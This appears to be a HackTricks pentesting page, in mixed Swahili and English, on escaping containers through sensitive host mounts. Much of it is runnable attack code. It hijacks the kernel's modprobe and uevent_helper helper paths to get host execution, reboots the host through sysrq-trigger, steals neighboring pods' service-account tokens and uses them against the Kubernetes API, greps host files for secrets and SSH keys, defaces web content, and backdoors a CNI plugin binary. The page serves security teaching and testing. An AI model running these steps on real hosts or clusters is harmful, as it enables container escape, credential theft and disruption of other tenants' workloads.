# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Host mounts ni mojawapo ya surface muhimu zaidi za practical container-escape kwa sababu mara nyingi huondoa view iliyotengwa kwa uangalifu ya process na kuirudisha moja kwa moja kwenye visibility ya host resources. Kesi hatari hazihusu tu `/`. Bind mounts za `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, au device-related paths zinaweza kufichua kernel controls, credentials, neighboring container filesystems, na runtime management interfaces.

Ukurasa huu upo kando na pages za ulinzi binafsi kwa sababu abuse model ni ya cross-cutting. Writable host mount ni hatari kwa sehemu kwa sababu ya mount namespaces, kwa sehemu kwa sababu ya user namespaces, kwa sehemu kwa sababu ya AppArmor au SELinux coverage, na kwa sehemu kwa sababu ya host path gani hasa imefichuliwa. Kuuchukulia kama mada yake yenyewe hufanya attack surface iwe rahisi zaidi kuielewa.

## `/proc` Exposure

procfs ina taarifa za kawaida za process na pia high-impact kernel control interfaces. Bind mount kama `-v /proc:/host/proc` au container view inayofichua unexpected writable proc entries inaweza hivyo kusababisha information disclosure, denial of service, au direct host code execution.

High-value procfs paths ni pamoja na:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Anza kwa kuangalia ni entry zipi za high-value procfs zinaonekana au zinaweza kuandikwa:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Njia hizi zinavutia kwa sababu tofauti. `core_pattern`, `modprobe`, na `binfmt_misc` zinaweza kuwa host code-execution paths zinapoandikika. `kallsyms`, `kmsg`, `kcore`, na `config.gz` ni vyanzo vyenye nguvu vya reconnaissance kwa kernel exploitation. `sched_debug` na `mountinfo` zinafichua process, cgroup, na filesystem context ambayo inaweza kusaidia kuunda upya host layout kutoka ndani ya container.

Thamani ya vitendo ya kila path ni tofauti, na kuvitendea vyote kana kwamba vina impact sawa hufanya triage kuwa ngumu zaidi:

- `/proc/sys/kernel/core_pattern`
Ikwa inaweza kuandikika, hii ni mojawapo ya procfs paths zenye impact kubwa zaidi kwa sababu kernel itatekeleza pipe handler baada ya crash. Container inayoweza kuelekeza `core_pattern` kwenye payload iliyohifadhiwa kwenye overlay yake au kwenye mounted host path mara nyingi inaweza kupata host code execution. Tazama pia [read-only-paths.md](protections/read-only-paths.md) kwa mfano maalum.
- `/proc/sys/kernel/modprobe`
Hii path hudhibiti userspace helper inayotumiwa na kernel inapohitaji kuita module-loading logic. Ikiwa inaweza kuandikika kutoka kwenye container na kufasiriwa katika host context, inaweza kuwa primitive nyingine ya host code-execution. Inavutia hasa ikichanganywa na njia ya kuanzisha helper path.
- `/proc/sys/vm/panic_on_oom`
Hii kwa kawaida si primitive safi ya escape, lakini inaweza kubadilisha memory pressure kuwa host-wide denial of service kwa kubadili OOM conditions kuwa kernel panic behavior.
- `/proc/sys/fs/binfmt_misc`
Ikiwa registration interface inaweza kuandikika, attacker anaweza kusajili handler kwa magic value iliyochaguliwa na kupata execution katika host-context wakati file inayolingana inatekelezwa.
- `/proc/config.gz`
Inafaa kwa kernel exploit triage. Husaidia kubaini ni subsystems gani, mitigations, na optional kernel features zipi zimewezeshwa bila kuhitaji host package metadata.
- `/proc/sysrq-trigger`
Kwa kiasi kikubwa ni denial-of-service path, lakini ni mbaya sana. Inaweza reboot, panic, au kwa namna nyingine kusababisha disruption ya host mara moja.
- `/proc/kmsg`
Hufichua kernel ring buffer messages. Inafaa kwa host fingerprinting, crash analysis, na katika baadhi ya mazingira kwa leak ya taarifa inayosaidia kernel exploitation.
- `/proc/kallsyms`
Ni muhimu inapoweza kusomwa kwa sababu hufichua exported kernel symbol information na huenda ikasaidia kuvunja mawazo ya address randomization wakati wa kutengeneza kernel exploit.
- `/proc/[pid]/mem`
Hii ni direct process-memory interface. Ikiwa target process inaweza kufikiwa na masharti muhimu ya ptrace-style, inaweza kuruhusu kusoma au kurekebisha memory ya process nyingine. Impact halisi inategemea sana credentials, `hidepid`, Yama, na ptrace restrictions, kwa hiyo ni path yenye nguvu lakini ya masharti.
- `/proc/kcore`
Hufichua core-image-style view ya system memory. File hii ni kubwa sana na ni ngumu kuitumia, lakini ikiwa inaweza kusomwa kwa maana, inaonyesha host memory surface iliyofichuliwa vibaya.
- `/proc/kmem` na `/proc/mem`
Kwa kihistoria ni high-impact raw memory interfaces. Katika mifumo mingi ya kisasa zimezimwa au zimewekewa vizuizi vikali, lakini zikiwepo na zinaweza kutumika, zinapaswa kuchukuliwa kama findings muhimu sana.
- `/proc/sched_debug`
Hufichua scheduling na task information ambayo inaweza kuonyesha host process identities hata wakati views nyingine za process zinaonekana safi kuliko inavyotarajiwa.
- `/proc/[pid]/mountinfo`
Ni muhimu sana kwa kuunda upya mahali container hasa inapoishi kwenye host, ni paths zipi zinaungwa na overlay, na kama writable mount inalingana na host content au layer ya container pekee.

Ikiwa `/proc/[pid]/mountinfo` au overlay details zinaweza kusomwa, zitumie kurejesha host path ya container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Amri hizi ni muhimu kwa sababu mbinu kadhaa za host-execution zinahitaji kubadilisha njia iliyo ndani ya container kuwa njia inayolingana kwa mtazamo wa host.

### Full Example: `modprobe` Helper Path Abuse

Ikiwa `/proc/sys/kernel/modprobe` inaweza kuandikwa kutoka kwenye container na helper path inatafsiriwa katika muktadha wa host, inaweza kuelekezwa upya kwa payload inayodhibitiwa na mshambulizi:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Kichocheo halisi kinategemea lengo na tabia ya kernel, lakini jambo muhimu ni kwamba njia ya helper inayoweza kuandikwa inaweza kuelekeza invocation ya baadaye ya kernel helper kwenye content ya host-path inayodhibitiwa na mshambuliaji.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Ikiwa lengo ni tathmini ya exploitability badala ya immediate escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Amri hizi husaidia kujibu kama taarifa muhimu za symbol zinaonekana, kama kernel messages za hivi karibuni zinafichua state ya kuvutia, na ni feature au mitigation gani za kernel zime-compile ndani. Athari kwa kawaida si direct escape, lakini zinaweza kupunguza kwa kiasi kikubwa muda wa triage wa kernel-vulnerability.

### Full Example: SysRq Host Reboot

Kama `/proc/sysrq-trigger` inaweza kuandikwa na inafikia host view:
```bash
echo b > /proc/sysrq-trigger
```
Dhaifu ni host reboot ya papo hapo. Huu si mfano wa hila, lakini unaonyesha wazi kwamba ufichuzi wa procfs unaweza kuwa serious zaidi kuliko information disclosure.

## `/sys` Exposure

sysfs hufichua kiasi kikubwa cha kernel na device state. Baadhi ya sysfs paths ni muhimu hasa kwa fingerprinting, huku nyingine zikiweza kuathiri helper execution, device behavior, security-module configuration, au firmware state.

High-value sysfs paths ni pamoja na:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Paths hizi ni muhimu kwa sababu tofauti. `/sys/class/thermal` inaweza kuathiri thermal-management behavior na hivyo host stability katika mazingira yaliyofichuliwa vibaya. `/sys/kernel/vmcoreinfo` inaweza leak crash-dump na kernel-layout information ambayo husaidia kwa low-level host fingerprinting. `/sys/kernel/security` ni `securityfs` interface inayotumiwa na Linux Security Modules, hivyo access isiyotarajiwa hapo inaweza kufichua au kubadilisha MAC-related state. EFI variable paths zinaweza kuathiri firmware-backed boot settings, na kuzifanya kuwa serious zaidi kuliko ordinary configuration files. `debugfs` chini ya `/sys/kernel/debug` ni especially dangerous kwa sababu kwa makusudi ni developer-oriented interface yenye safety expectations chache sana kuliko hardened production-facing kernel APIs.

Useful review commands for these paths are:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Ni nini hufanya amri hizo ziwe za kuvutia:

- `/sys/kernel/security` inaweza kufichua kama AppArmor, SELinux, au LSM nyingine inaonekana kwa njia ambayo ilipaswa kubaki host-only.
- `/sys/kernel/debug` mara nyingi ndiyo finding ya kutisha zaidi katika kundi hili. Ikiwa `debugfs` ime-mounted na inaweza kusomwa au kuandikwa, tarajia surface kubwa inayolenga kernel, ambapo hatari halisi hutegemea debug nodes zilizo-enabled.
- Ufunuo wa EFI variables si wa kawaida sana, lakini ukikuwepo una impact kubwa kwa sababu hugusa settings za firmware-backed badala ya files za kawaida za runtime.
- `/sys/class/thermal` hasa inahusiana na host stability na mwingiliano wa hardware, si kwa neat shell-style escape.
- `/sys/kernel/vmcoreinfo` hasa ni chanzo cha host-fingerprinting na crash-analysis, kinachofaa kwa kuelewa low-level kernel state.

### Full Example: `uevent_helper`

Ikiwa `/sys/kernel/uevent_helper` inaweza kuandikwa, kernel inaweza kutekeleza helper inayodhibitiwa na attacker wakati `uevent` inapotolewa:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Sababu hii inafanya kazi ni kwamba helper path hutafsiriwa kutoka mtazamo wa host. Mara tu inapochochewa, helper huendeshwa katika host context badala ya ndani ya container ya sasa.

## `/var` Exposure

Kuweka host's `/var` ndani ya container mara nyingi hudharauliwa kwa sababu haionekani kuwa ya kushangaza kama kuweka `/`. Kwa vitendo, inaweza kuwa ya kutosha kufikia runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens, na neighboring application filesystems. Kwenye nodes za kisasa, `/var` mara nyingi ndio mahali ambapo state ya container iliyo muhimu zaidi kiutendaji huishi kwa kweli.

### Kubernetes Example

Pod yenye `hostPath: /var` mara nyingi inaweza kusoma projected tokens za pods zingine na overlay snapshot content:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Amri hizi ni muhimu kwa sababu zinajibu kama mount inaonyesha tu data ya kawaida ya programu au credentials za cluster zenye athari kubwa. token ya service-account inayosomeka inaweza mara moja kubadilisha local code execution kuwa Kubernetes API access.

Ikiwa token ipo, thibitisha inaweza kufikia nini badala ya kuishia kwenye token discovery:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Athari hapa inaweza kuwa kubwa zaidi kuliko local node access. Token yenye broad RBAC inaweza kubadilisha `/var` iliyomountwa kuwa cluster-wide compromise.

### Docker And containerd Example

On Docker hosts the relevant data is often under `/var/lib/docker`, while on containerd-backed Kubernetes nodes it may be under `/var/lib/containerd` or snapshotter-specific paths:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Ikiwa `/var` iliyopandishwa inaonyesha snapshot contents zinazoweza kuandikwa za workload nyingine, mshambuliaji anaweza kubadilisha application files, kupandikiza web content, au kubadilisha startup scripts bila kugusa current container configuration.

Mawazo mahsusi ya abuse mara tu writable snapshot content inapopatikana:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Amri haya ni muhimu kwa sababu yanaonyesha familia tatu kuu za athari za mounted `/var`: application tampering, secret recovery, na lateral movement kwenda kwenye neighboring workloads.

## Kubelet State, Plugins, And CNI Paths

Mount ya `/var/lib/kubelet`, `/opt/cni/bin`, au `/etc/cni/net.d` mara nyingi hufichuliwa kupitia privileged DaemonSets, CNI agents, CSI node plugins, GPU operators, na storage helpers. Mount hizi ni rahisi kudhaniwa kama "node plumbing", lakini ziko moja kwa moja katika execution path ya pods mpya na mara nyingi huwa na kubelet credentials, projected secrets, registration sockets, na executable host-side plugin binaries.

High-value targets ni pamoja na:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Useful review commands are:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Kwa nini paths hizi ni muhimu:

- `/var/lib/kubelet/pki` inaweza kufichua kubelet client certificates na credentials nyingine za node-local ambazo wakati mwingine zinaweza kutumiwa tena dhidi ya API server au kubelet-facing TLS endpoints, kulingana na muundo wa cluster.
- `/var/lib/kubelet/pods` mara nyingi huwa na projected service-account tokens na mounted Secrets za neighboring pods kwenye node ile ile.
- `/var/lib/kubelet/pod-resources/kubelet.sock` hasa ni reconnaissance surface, lakini muhimu sana: inaonyesha ni pods na containers zipi sasa zinamiliki GPUs, hugepages, SR-IOV devices, na scarce node-local resources nyingine.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, na `/var/lib/kubelet/plugins_registry` zinaonyesha ni CSI, DRA, na device plugins zipi zimewekwa na ni sockets zipi kubelet inatarajiwa kuzungumza nazo. Ikiwa directories hizo zinaweza kuandikwa badala ya kusomwa tu, finding inakuwa serious zaidi.
- `/opt/cni/bin` na `/etc/cni/net.d` ziko moja kwa moja kwenye path ya pod-network setup. Writable access huko mara nyingi ni delayed host-execution primitive badala ya exposure ya configuration tu.

### Full Example: Writable `/opt/cni/bin`

If a host CNI binary directory is mounted read-write, replacing a plugin can be enough to obtain host execution the next time the kubelet creates a pod sandbox on that node:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Hili si la papo hapo kama `docker.sock` iliyopandishwa, lakini mara nyingi ni halisi zaidi katika compromised Kubernetes infrastructure pods. Jambo muhimu ni kwamba binary iliyobadilishwa baadaye hutekelezwa na host network setup flow, si na current container.


## Runtime Sockets

Sensitive host mounts mara nyingi hujumuisha runtime sockets badala ya full directories. Haya ni muhimu sana kiasi kwamba yanastahili kurudiwa wazi hapa:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Ona [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) kwa mtiririko kamili wa exploitation mara tu mojawapo ya sockets hizi inapowekwa.

Kama muundo wa haraka wa mwingiliano wa kwanza:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Ikiwa mojawapo ya hizi itafanikiwa, njia kutoka kwa "mounted socket" hadi "start a more privileged sibling container" kwa kawaida ni fupi zaidi kuliko njia yoyote ya kernel breakout.

## Mount-Related CVEs

Host mounts pia huingiliana na runtime vulnerabilities. Mifano muhimu ya hivi karibuni ni pamoja na:

- `CVE-2024-21626` katika `runc`, ambapo leaked directory file descriptor inaweza kuweka working directory kwenye host filesystem.
- `CVE-2024-23651`, `CVE-2024-23652`, na `CVE-2024-23653` katika BuildKit, ambapo malicious Dockerfiles, frontends, na `RUN --mount` flows zinaweza kuanzisha upya host file access, deletion, au elevated privileges wakati wa builds.
- `CVE-2024-1753` katika Buildah na Podman build flows, ambapo crafted bind mounts wakati wa build zinaweza kufichua `/` read-write.
- `CVE-2025-47290` katika `containerd` 2.1.0, ambapo TOCTOU wakati wa image unpack inaweza kuruhusu specially crafted image kurekebisha host filesystem wakati wa pull.

Hizi CVEs ni muhimu hapa kwa sababu zinaonyesha kwamba handling ya mount si tu kuhusu operator configuration. Runtime yenyewe pia inaweza kuanzisha mount-driven escape conditions.

## Checks

Tumia commands hizi ili kupata haraka mount exposures za thamani kubwa zaidi:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Kinachovutia hapa:

- Host root, `/proc`, `/sys`, `/var`, na runtime sockets zote ni matokeo ya kipaumbele cha juu.
- Writable proc/sys entries mara nyingi humaanisha mount inaonyesha host-global kernel controls badala ya container view salama.
- Mounted `/var` paths zinastahili credential na neighboring-workload review, si filesystem review tu.
- Kubelet state directories na CNI/plugin paths zinastahili kipaumbele sawa na runtime sockets kwa sababu mara nyingi hukaa moja kwa moja kwenye pod-creation na credential-distribution path ya node.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
